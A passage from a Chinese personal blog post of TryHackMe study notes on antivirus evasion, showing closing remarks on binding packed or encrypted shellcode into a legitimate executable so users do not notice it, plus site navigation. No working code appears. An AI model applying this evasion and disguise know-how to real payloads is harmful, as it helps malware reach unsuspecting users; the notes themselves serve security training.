<p>创建真正的有效负载时，您可能需要使用编码器、加密器或加壳器来隐藏基于签名的反病毒软件的 shellcode，然后将其绑定到已知的可执行文件中，以便用户不知道正在执行什么。</p>
<p>请随意尝试将绑定的可执行文件上传到 THM Antivirus Check 网站（桌面上有链接），无需任何打包，您应该会从服务器返回检测结果，因此在尝试执行此操作时，此方法不会有太大帮助。 自己从服务器获取标志。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0AVEvasionShellcode/">http://mikannse.space/2024/04/08/THM免杀学习AVEvasionShellcode/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0ObfuscationPrinciples/" title="THM免杀学习ObfuscationPrinciples"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM免杀学习ObfuscationPrinciples</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0IntroductiontoAntivirus/" title="THM免杀学习IntroductiontoAntivirus"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM免杀学习IntroductiontoAntivirus</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/08/11/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0EvadingLoggingandMonitoring/" title="THM免杀学习EvadingLoggingandMonitoring"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-11</div><div class="title">THM免杀学习EvadingLoggingandMonitoring</div></div></a></div><div><a href="/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0IntroductiontoAntivirus/" title="THM免杀学习IntroductiontoAntivirus"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-08</div><div class="title">THM免杀学习IntroductiontoAntivirus</div></div></a></div><div><a href="/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0ObfuscationPrinciples/" title="THM免杀学习ObfuscationPrinciples"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-08</div><div class="title">THM免杀学习ObfuscationPrinciples</div></div></a></div><div><a href="/2024/08/11/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0RuntimeDetectionEvasion/" title="THM免杀学习RuntimeDetectionEvasion"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-11</div><div class="title">THM免杀学习RuntimeDetectionEvasion</div></div></a></div><div><a href="/2024/04/09/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0SignatureEvasion/" title="THM免杀学习SignatureEvasion"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-09</div><div class="title">THM免杀学习SignatureEvasion</div></div></a></div><div><a href="/2024/03/14/ContainerVulnerabilitiesTHM/" title="ContainerVulnerabilitiesTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-14</div><div class="title">ContainerVulnerabilitiesTHM</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">309</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PE-Structure"><span class="toc-number">1.</span> <span class="toc-text">PE Structure</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction-to-Shellcode"><span class="toc-number">2.</span> <span class="toc-text">Introduction to Shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Generate-Shellcode"><span class="toc-number">3.</span> <span class="toc-text">Generate Shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Staged-Payloads"><span class="toc-number">4.</span> <span class="toc-text">Staged Payloads</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction-to-Encoding-and-Encryption"><span class="toc-number">5.</span> <span class="toc-text">Introduction to Encoding and Encryption</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shellcode-Encoding-and-Encryption"><span class="toc-number">6.</span> <span class="toc-text">Shellcode Encoding and Encryption</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Packers"><span class="toc-number">7.</span> <span class="toc-text">Packers</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Binders"><span class="toc-number">8.</span> <span class="toc-text">Binders</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/14/Python3%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%A7%A3%E6%9E%90%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" title="Python3爬虫开发笔记第三章解析库的使用">Python3爬虫开发笔记第三章解析库的使用</a><time datetime="2024-12-14T06:33:42.000Z" title="发表于 2024-12-14 14:33:42">2024-12-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%83)%E4%B9%8BVulnHubDeathNote/" title="打靶记录(一六七)之VulnHubDeathNote">打靶记录(一六七)之VulnHubDeathNote</a><time datetime="2024-12-07T09:05:21.000Z" title="发表于 2024-12-07 17:05:21">2024-12-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E5%85%AD)%E4%B9%8BVulnHubVikings/" title="打靶记录(一六六)之VulnHubVikings">打靶记录(一六六)之VulnHubVikings</a><time datetime="2024-12-07T08:08:20.000Z" title="发表于 2024-12-07 16:08:20">2024-12-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/02/24-11%E6%9D%82%E8%B0%88/" title="24-11杂谈">24-11杂谈</a><time datetime="2024-12-02T06:12:07.000Z" title="发表于 2024-12-02 14:12:07">2024-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/02/2024%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWP(Web)/" title="2024福建省数据安全大赛WP(Web)">2024福建省数据安全大赛WP(Web)</a><time datetime="2024-12-01T16:11:19.000Z" title="发表于 2024-12-02 00:11:19">2024-12-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  const disqus_config = function () {
    this.page.url = 'http://mikannse.space/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0AVEvasionShellcode/'
    this.page.identifier = '/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0AVEvasionShellcode/'
    this.page.title = 'THM免杀学习AVEvasionShellcode'
  }

  const disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  btf.addModeChange('disqus', disqusReset)

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>